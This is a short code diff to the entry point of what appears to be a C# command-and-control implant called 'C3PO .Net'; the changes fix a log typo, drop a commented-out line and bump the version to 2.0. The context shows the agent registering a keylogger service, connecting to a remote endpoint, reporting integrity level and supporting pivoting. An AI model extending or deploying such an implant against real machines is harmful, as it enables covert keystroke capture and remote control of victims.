@@ -26,7 +26,7 @@ namespace EntryPoint
         {
 
 #if DEBUG
-            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "tarting!");
+            System.IO.File.AppendAllText(@"c:\users\olivier\log.txt", "starting!");
 #endif
 
 #if DEBUG
@@ -106,8 +106,6 @@ namespace EntryPoint
             ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
 
             //ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
-            //ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
-
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion);
             var agent = new Agent.Agent(metaData, commModule);
@@ -160,7 +158,7 @@ namespace EntryPoint
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "C3PO .Net 1.1",
+                Version = "C3PO .Net 2.0",
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
